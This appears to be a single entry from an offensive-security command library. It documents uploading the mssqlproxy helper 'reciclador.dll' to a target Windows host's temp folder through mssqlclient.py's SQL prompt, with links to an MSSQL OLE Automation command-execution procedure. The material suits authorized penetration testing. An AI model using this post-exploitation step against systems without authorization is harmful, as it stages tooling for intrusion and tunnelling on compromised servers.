---
id: 99742e76-b5ab-445f-8555-d22ff94cd6a3
name: sql-upload-reciclador-dll
type: command
executor: sql
data: upload reciclador.dll $_DLL_PATH
output: null
created_at: '2023-04-06T03:56:20.471920+00:00'
updated_at: '2023-04-10T20:36:31.774363+00:00'
platforms:
  - Windows
tags:
  - upload
  - dll
verified: true
validated: true
---

# sql-upload-reciclador-dll

## Command

```sql
upload reciclador.dll $_DLL_PATH
```

## Description

Uploads the reciclador.dll file to the target path using mssqlclient.py's SQL prompt.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| reciclador.dll | Local DLL file | Yes |
| $_DLL_PATH | Target path (e.g., C:\windows\temp\reciclador.dll) | Yes |

## Examples

### Basic Usage

In mssqlclient.py prompt: upload reciclador.dll C:\windows\temp\reciclador.dll

## Expected Output

File upload complete.

## Related

- [[procedures/MSSQL-OLE-Automation-Command-Execution]]
- [[tools/mssqlproxy]]
